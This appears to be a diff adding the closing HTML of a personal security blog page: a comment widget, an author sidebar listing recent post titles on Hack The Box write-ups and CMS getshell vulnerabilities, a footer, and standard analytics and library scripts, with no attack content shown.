+  
+  
+
+  
+    <script src="https://utteranc.es/client.js"
+            repo="F0r3at/Getshe11.com"
+            issue-term="pathname"
+            theme="github-light"
+            crossorigin="anonymous"
+            async>
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="https://github.com/utterance">comments powered by utterances.</a></noscript>
+
+    </div>
+</div>
+            </div>
+            
+            <div class="col-second">
+                <div class="col-box col-box-author">
+    <img class="avatar" src="../../images/avatar.jpg" alt="F0rmat">
+    <div class="col-box-title name">F0rmat</div>
+    <p>Stay Hungry, Stay Foolish.</p>
+    <p class="contact">
+        <a href="http://github.com/F0r3at">Github</a>
+    </p>
+</div>
+
+<div class="col-box">
+    <div class="col-box-title">Newest Posts</div>
+    <ul class="post-list">
+        
+        <li>
+            <a href="https://getshe11.com/post/pd-chrome-3d/" class="post-link">关于Kali2020安装Parallels Tools后Chrome显示空白</a>
+        </li>
+        
+        <li>
+            <a href="https://getshe11.com/post/install-parallels-tools-on-kali-linux-2020.4/" class="post-link">Kali Linux 2020.4安装Parallels Tools</a>
+        </li>
+        
+        <li>
+            <a href="https://getshe11.com/post/pathfinder/" class="post-link">Hackthebox-Pathfinder</a>
+        </li>
+        
+        <li>
+            <a href="https://getshe11.com/post/domain-security/" class="post-link">Windows认证与域渗透</a>
+        </li>
+        
+        <li>
+            <a href="https://getshe11.com/post/shield/" class="post-link">Hackthebox-Shield</a>
+        </li>
+        
+        <li>
+            <a href="https://getshe11.com/post/archetype/" class="post-link">Hackthebox-Archetype</a>
+        </li>
+        
+        <li>
+            <a href="https://getshe11.com/post/oopsie/" class="post-link">Hackthebox-Oopsie</a>
+        </li>
+        
+        <li>
+            <a href="https://getshe11.com/post/vaccine/" class="post-link">Hackthebox-Vaccine</a>
+        </li>
+        
+        <li>
+            <a href="https://getshe11.com/post/bc-penetration-diary/" class="post-link">Bc站渗透日记</a>
+        </li>
+        
+        <li>
+            <a href="https://getshe11.com/post/maccms8-latest-command-execution-vulnerability/" class="post-link">Maccms8最新命令执行漏洞</a>
+        </li>
+        
+        <li>
+            <a href="https://getshe11.com/post/seacms9.92-from-variable-override-to-getshell/" class="post-link">Seacms9.92从变量覆盖到getshell</a>
+        </li>
+        
+        <li>
+            <a href="https://getshe11.com/post/seacms-front-desk-getshell/" class="post-link">Seacms&lt;=9.92前台Getshell</a>
+        </li>
+        
+        <li>
+            <a href="https://getshe11.com/post/a-difficult-penetration-process/" class="post-link">一次艰难的渗透提权过程</a>
+        </li>
+        
+        <li>
+            <a href="https://getshe11.com/post/an-app-distribution-system-upload-vulnerability/" class="post-link">某云分发APP上传漏洞</a>
+        </li>
+        
+        <li>
+            <a href="https://getshe11.com/post/analysis-of-php-deserialization-vulnerabilities/" class="post-link">浅析PHP反序列化漏洞</a>
+        </li>
+        
+    </ul>
+</div>
+
+<div class="col-box post-toc hide">
+    <div class="col-box-title">TOC</div>
+</div>
+            </div>
+        </div>
+    </div>
+    
+    <footer class="footer">
+        <div class="wrapper">
+    © 2021    <a href="https://getshe11.com">F0rmat</a>
+</div>
+    </footer>
+    
+    
+<script src="https://cdn.jsdelivr.net/npm/jquery@1.11.0/dist/jquery.min.js"></script>
+
+<script src="/js/easybook.js"></script>
+
+<script src="/js/lazysizes.min.js"></script>
+
+<script src="https://cdn.jsdelivr.net/npm/lightgallery@1.6.12/dist/js/lightgallery-all.min.js"></script>
+<script src="/js/figure.js"></script>
+
+
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'UA-XXXXXXXX-X', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+
+
+
+
+
+
+</body>
+
+</html>
